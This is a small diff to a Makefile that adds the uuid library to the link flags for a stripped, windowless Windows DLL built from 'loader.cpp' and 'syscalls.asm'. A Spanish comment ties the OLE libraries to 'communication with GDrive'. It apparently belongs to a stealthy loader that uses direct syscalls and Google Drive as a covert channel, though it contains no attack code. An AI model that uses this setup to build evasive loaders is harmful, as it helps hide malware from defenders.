@@ -8,12 +8,12 @@ CFLAGS = -O3 -s -mwindows -m64 -fno-asynchronous-unwind-tables \
          -I./src
 
 # Flags de Linker para ASLR/DEP y Stripping
-# NOTA: Añadido -lole32 -loleaut32 para la comunicación con GDrive
+# NOTA: Añadido -lole32 -loleaut32 -luuid para la comunicación con GDrive
 LDFLAGS = -shared -static-libgcc -static-libstdc++ \
           -Wl,--strip-all -Wl,--discard-all \
           -Wl,--dynamicbase -Wl,--nxcompat \
           -Wl,--high-entropy-va -Wl,--subsystem,windows \
-          -lole32 -loleaut32
+          -lole32 -loleaut32 -luuid
 
 SRC_FILES = src/loader.cpp
 ASM_FILES = src/syscalls.asm
